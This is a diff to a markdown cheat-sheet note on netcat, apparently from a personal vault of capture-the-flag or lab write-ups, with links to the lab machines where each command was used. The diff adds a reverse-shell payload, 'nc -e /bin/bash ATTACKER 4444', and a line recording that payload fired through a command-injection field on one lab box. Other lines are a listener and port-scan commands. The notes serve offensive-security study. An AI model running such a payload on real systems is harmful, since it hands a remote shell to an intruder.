@@ -14,6 +14,9 @@ Swiss-army network utility. In this vault it's primarily the reverse-shell **lis
 # Reverse-shell listener
 nc -lvnp 443
 
+# Reverse-shell *payload* (runs on the target, connects out; `-e` is absent on some builds)
+nc -e /bin/bash ATTACKER 4444
+
 # Port scan / banner grab
 nc -zv TARGET 1-1000
 nc TARGET 80
@@ -28,4 +31,4 @@ nc TARGET 443 < in.bin    # sender
 
 ## Seen in
 
-Listener for reverse shells in [[hannah-coffee]], [[baluhome]], [[ignite]], [[balulero]], [[autoescuela]], [[grooti]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[domain]] (privileged port `433`, run with `sudo`); used to trigger [[vsftpd-backdoor]] in [[first-hacking]] and [[tproot]]; raw TCP client for the [[wargames]] WOPR text game.
+Listener for reverse shells in [[hannah-coffee]], [[baluhome]], [[ignite]], [[balulero]], [[autoescuela]], [[grooti]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[domain]] (privileged port `433`, run with `sudo`); used to trigger [[vsftpd-backdoor]] in [[first-hacking]] and [[tproot]]; raw TCP client for the [[wargames]] WOPR text game; `nc -e /bin/bash` as the outgoing payload fired through a `cmd` field on [[dark]].
